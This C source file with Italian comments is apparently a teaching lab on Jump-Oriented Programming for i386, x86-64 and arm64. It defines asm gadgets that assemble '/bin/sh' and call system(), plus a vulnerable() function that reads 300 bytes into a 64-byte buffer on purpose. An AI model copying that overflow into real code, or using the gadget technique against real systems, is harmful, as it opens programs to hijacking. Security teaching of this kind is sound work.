/*
 * Jump Oriented Programming (JOP).
 * Basato su "SS_3.3" (slide 6-10) e sull'articolo di riferimento
 * Bletsch, Jiang, Freeh, Smith - "Jump-Oriented Programming: A New Class
 * of Code-Reuse Attack" (ASIACCS 2011): a differenza del ROP (esempio 04,
 * catena di gadget sullo stack, ognuno terminante con `ret`), qui la
 * catena vive in una "dispatch table" (un'area dati qualsiasi: qui sullo
 * stack, nel payload dell'overflow) e ogni gadget funzionale termina con
 * un *salto indiretto* verso un "dispatcher gadget" che fa avanzare un
 * puntatore nella tabella. Il controllo non richiede piu' ESP+`ret`, ma
 * EIP + un registro usato come "program counter" della catena.
 *
 * Come in rop.c, per avere un esempio DETERMINISTICO e didattico i gadget
 * non sono sequenze di istruzioni "rastrellate" nel binario (fragili da
 * garantire, vedi la nota storica in solutions/05-jop/README.md) ma
 * funzioni intere scritte apposta: funzioni `naked` con asm inline che
 * terminano con un salto indiretto invece che con `ret`. L'overflow in
 * vulnerable() serve solo a dirottare il return address su jop_start, un
 * trampolino che carica il registro-PC della catena con l'indirizzo della
 * dispatch table e cede il controllo al dispatcher.
 *
 * La dispatch table vive sullo stack, nel payload dell'overflow, subito
 * dopo il return address: jop_start la individua dal registro stack
 * pointer (al suo ingresso SP/ESP punta gia' al primo elemento della
 * tabella). Cosi' l'exploit NON ha bisogno di conoscere un indirizzo di
 * stack assoluto (niente leak/corefile), gli basta l'OFFSET dell'overflow
 * - un dettaglio importante perche' su un host x86/arm64 NATIVO il
 * corefile automatico non e' disponibile (vedi solutions/05-jop/
 * README.md). Dopo l'inizializzazione lo stack pointer non e' piu' usato
 * come "PC" della catena: quello e' un registro dedicato (EDI su i386,
 * R12 su x86-64) - e' la differenza concettuale col ROP.
 *
 * Il sorgente e' lo STESSO per i386, x86-64 e arm64 (le slide usano x86;
 * su arm64 il JOP e' anzi piu' naturale, vedi sotto): l'asm dei gadget e'
 * guardato per architettura.
 *
 * Nota arm64 (AArch64): a differenza di 04-rop (dove il porting ROP si
 * scontra con il self-loop delle funzioni foglia via `ret`, vedi
 * 04-rop/README.md), qui la catena NON usa mai `ret`: il dispatcher usa
 * `br` (branch-to-register), i gadget `b`/`bl`. Il problema di 04-rop e'
 * quindi del tutto assente - il JOP e' il caso in cui AArch64 funziona
 * meglio di x86 per i code-reuse "a piu' stadi".
 *
 * Compilare con: vuln-gcc -o jop jop.c   (i386, come nelle slide)
 *            o:  vuln-gcc64 -o jop jop.c  (x86-64)
 *            o:  vuln-gcc -o jop jop.c    (arm64, nativo)
 * Uso: input (binario, incluso il byte nullo) da stdin.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#if defined(__i386__) || defined(__x86_64__) || defined(__aarch64__)

char command[32];

#if defined(__i386__)
/* ---- i386 (cdecl, 32 bit): EDI = PC della catena ---- */

/* Dispatcher gadget: avanza EDI nella dispatch table e salta al gadget il
 * cui indirizzo e' memorizzato nella tabella. E' il cuore del JOP: ogni
 * gadget funzionale gli ritorna il controllo con `jmp dispatcher`. */
__attribute__((naked)) void dispatcher(void) {
    __asm__ volatile(
        "movl (%edi), %eax\n"   /* EAX = prossimo gadget nella tabella */
        "addl $4, %edi\n"       /* avanza il "PC" della catena          */
        "jmp *%eax\n"           /* salto indiretto al gadget            */
    );
}

/* Gadget funzionale 1: scrive "/bin" in command[0..3]. */
__attribute__((naked)) void g_bin(void) {
    __asm__ volatile(
        "movl $0x6e69622f, command\n"   /* "/bin" (little-endian) */
        "jmp dispatcher\n"
    );
}

/* Gadget funzionale 2: scrive "/sh\0" in command[4..7]. */
__attribute__((naked)) void g_sh(void) {
    __asm__ volatile(
        "movl $0x0068732f, command+4\n" /* "/sh\0" (little-endian) */
        "jmp dispatcher\n"
    );
}

/* Gadget funzionale 3: system(command). */
__attribute__((naked)) void g_exec(void) {
    __asm__ volatile(
        "pushl $command\n"
        "call system\n"
        "jmp dispatcher\n"      /* al ritorno della shell: non prosegue */
    );
}

/* Trampolino d'ingresso: l'overflow ritorna qui. Al ritorno ESP punta
 * gia' al primo elemento della dispatch table (nel payload, subito dopo
 * il return address): lo si copia in EDI e si cede il controllo al
 * dispatcher. Nessun indirizzo assoluto da conoscere. */
__attribute__((naked)) void jop_start(void) {
    __asm__ volatile(
        "movl %esp, %edi\n"     /* EDI = &dispatch_table (= ESP qui) */
        "jmp dispatcher\n"
    );
}

#elif defined(__x86_64__)
/* ---- x86-64 (System V AMD64): R12 = PC della catena ----
 * R12 e' callee-saved e NON e' un registro di argomento, quindi non viene
 * sporcato dall'ABI quando i gadget chiamano system() (che usa RDI). */

__attribute__((naked)) void dispatcher(void) {
    __asm__ volatile(
        "movq (%r12), %rax\n"   /* RAX = prossimo gadget nella tabella */
        "addq $8, %r12\n"       /* avanza il "PC" (indirizzi a 8 byte)  */
        "jmp *%rax\n"
    );
}

__attribute__((naked)) void g_bin(void) {
    __asm__ volatile(
        "movl $0x6e69622f, command(%rip)\n"     /* "/bin" */
        "jmp dispatcher\n"
    );
}

__attribute__((naked)) void g_sh(void) {
    __asm__ volatile(
        "movl $0x0068732f, command+4(%rip)\n"   /* "/sh\0" */
        "jmp dispatcher\n"
    );
}

__attribute__((naked)) void g_exec(void) {
    __asm__ volatile(
        "leaq command(%rip), %rdi\n"    /* primo argomento in RDI */
        "andq $-16, %rsp\n"             /* stack a 16 byte per system() */
        "call system\n"
        "jmp dispatcher\n"
    );
}

__attribute__((naked)) void jop_start(void) {
    __asm__ volatile(
        "movq %rsp, %r12\n"     /* R12 = &dispatch_table (= RSP qui) */
        "jmp dispatcher\n"
    );
}

#else /* __aarch64__ */
/* ---- arm64 (AAPCS64): X19 = PC della catena ----
 * X19 e' callee-saved e non e' registro di argomento. Nessun `ret` nella
 * catena: il dispatcher usa `br`, i gadget `b`/`bl` - quindi il self-loop
 * delle funzioni foglia di 04-rop qui non si presenta. */

__attribute__((naked)) void dispatcher(void) {
    __asm__ volatile(
        "ldr x1, [x19], #8\n"   /* X1 = *X19 ; X19 += 8 (post-index) */
        "br x1\n"               /* salto indiretto al gadget         */
    );
}

__attribute__((naked)) void g_bin(void) {
    __asm__ volatile(
        "adrp x2, command\n"
        "add x2, x2, :lo12:command\n"
        "movz w3, #0x622f\n"            /* "/bin" = 0x6e69622f */
        "movk w3, #0x6e69, lsl #16\n"
        "str w3, [x2]\n"
        "b dispatcher\n"
    );
}

__attribute__((naked)) void g_sh(void) {
    __asm__ volatile(
        "adrp x2, command\n"
        "add x2, x2, :lo12:command\n"
        "movz w3, #0x732f\n"            /* "/sh\0" = 0x0068732f */
        "movk w3, #0x0068, lsl #16\n"
        "str w3, [x2, #4]\n"
        "b dispatcher\n"
    );
}

__attribute__((naked)) void g_exec(void) {
    __asm__ volatile(
        "adrp x0, command\n"
        "add x0, x0, :lo12:command\n"   /* primo argomento in X0 */
        "bl system\n"
        "b dispatcher\n"
    );
}

/* Trampolino d'ingresso: l'overflow corrompe x30 salvato, il `ret` di
 * vulnerable() salta qui. Su AArch64, al nostro ingresso SP e' gia' stato
 * incrementato di tutto il frame dall'epilogo (`ldp x29,x30,[sp],#FRAME`),
 * quindi punta PIU' IN ALTO dello slot del return address: la dispatch
 * table va posizionata nel payload esattamente a quell'indirizzo (vedi
 * exploit-arm64.py, offset off-8+FRAME) e qui la si individua con
 * `mov x19, sp`. Resta relativo: nessun indirizzo assoluto da conoscere. */
__attribute__((naked)) void jop_start(void) {
    __asm__ volatile(
        "mov x19, sp\n"         /* X19 = &dispatch_table (= SP qui) */
        "b dispatcher\n"
    );
}

#endif /* arch */

void vulnerable(void) {
    char buffer[64];
    read(0, buffer, 300);   /* nessun controllo sulla lunghezza rispetto a buffer[64]: overflow */
}

int main(void) {
    memset(command, 0, sizeof(command));
    vulnerable();
    printf("Done.\n");

    return 0;
}

#else /* altra architettura (non i386/x86-64/arm64): non portato */

int main(void) {
    printf("05-jop: esempio disponibile su i386, x86-64 e arm64.\n"
           "Questa architettura non e' supportata (vedi solutions/05-jop/README.md).\n");
    return 0;
}

#endif
